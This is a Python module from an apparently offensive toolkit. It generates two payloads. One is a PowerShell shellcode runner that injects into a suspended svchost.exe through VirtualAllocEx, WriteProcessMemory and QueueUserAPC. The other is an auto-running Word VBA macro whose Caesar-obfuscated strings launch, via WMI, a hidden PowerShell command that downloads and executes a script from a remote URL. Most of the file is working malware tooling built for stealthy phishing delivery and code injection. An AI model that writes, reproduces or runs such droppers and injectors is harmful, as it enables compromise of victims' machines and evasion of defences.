import os
from ..core.utils import console, caesar_encrypt, format_ps1_shellcode

PS1_RUNNER_TEMPLATE = """
$code = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {{
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {{
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }}

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {{
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }}

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessW(IntPtr lpApplicationName, IntPtr lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);
}}
"@

Add-Type -TypeDefinition $code

# Payload
[byte[]]$sc = {shellcode}

# Target process - Using svchost.exe for stealth (no window)
$target = "C:\\\\Windows\\\\System32\\\\svchost.exe"
$pTarget = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($target)

$si = New-Object Win32+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$pi = New-Object Win32+PROCESS_INFORMATION

# CREATE_SUSPENDED = 0x00000004
$success = [Win32]::CreateProcessW([System.IntPtr]::Zero, $pTarget, [System.IntPtr]::Zero, [System.IntPtr]::Zero, $false, 0x00000004, [System.IntPtr]::Zero, [System.IntPtr]::Zero, [ref]$si, [ref]$pi)

if ($success) {{
    $addr = [Win32]::VirtualAllocEx($pi.hProcess, [System.IntPtr]::Zero, $sc.Length, 0x3000, 0x40)
    $outSize = [System.IntPtr]::Zero
    [Win32]::WriteProcessMemory($pi.hProcess, $addr, $sc, $sc.Length, [ref]$outSize)
    [Win32]::QueueUserAPC($addr, $pi.hThread, [System.IntPtr]::Zero)
    [Win32]::ResumeThread($pi.hThread)
}}
"""

VBA_TEMPLATE = """
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Dim Oatmilk As String
    Oatmilk = ""
    Do
        Oatmilk = Oatmilk & Pears(CInt(Strawberries(Milk)))
        Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Sub MyMacro()
    Dim Apples As String
    Dim Water As String
    Dim pid As Variant
    
    Apples = "{encrypted_payload}"
    Water = Nuts(Apples)
    
    ' Connect to WMI and create the process (De-chaining)
    ' Splitting the call for maximum compatibility and to avoid 80041001 errors
    GetObject(Nuts("{encrypted_winmgmts}")).Get(Nuts("{encrypted_win32_process}")).Create Water, Null, Null, pid
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
"""

def generate(shellcode, remote_url, filename, output_dir):
    ps1_formatted = format_ps1_shellcode(shellcode)
    ps1_output = PS1_RUNNER_TEMPLATE.format(shellcode=ps1_formatted)
    
    ps1_file = os.path.join(output_dir, "run.ps1")
    with open(ps1_file, "w") as f:
        f.write(ps1_output)
    console.print(f"[bold green][+] Success! PowerShell runner saved to: [bold white]{ps1_file}[/bold white][/bold green]")
    
    # Build PS command
    ps_cmd = f"powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('{remote_url}'))"
    
    # Encrypt
    enc_payload = caesar_encrypt(ps_cmd)
    enc_winmgmts = caesar_encrypt("winmgmts:")
    enc_win32_process = caesar_encrypt("Win32_Process")
    
    vba_output = VBA_TEMPLATE.format(
        encrypted_payload=enc_payload,
        encrypted_winmgmts=enc_winmgmts,
        encrypted_win32_process=enc_win32_process
    )
    
    vba_file = os.path.join(output_dir, "wmi_downloader.vba")
    with open(vba_file, "w") as f:
        f.write(vba_output)
        
    console.print(f"[bold green][+] Success! VBA WMI Macro saved to: [bold white]{vba_file}[/bold white][/bold green]")
    return vba_file, ps1_file
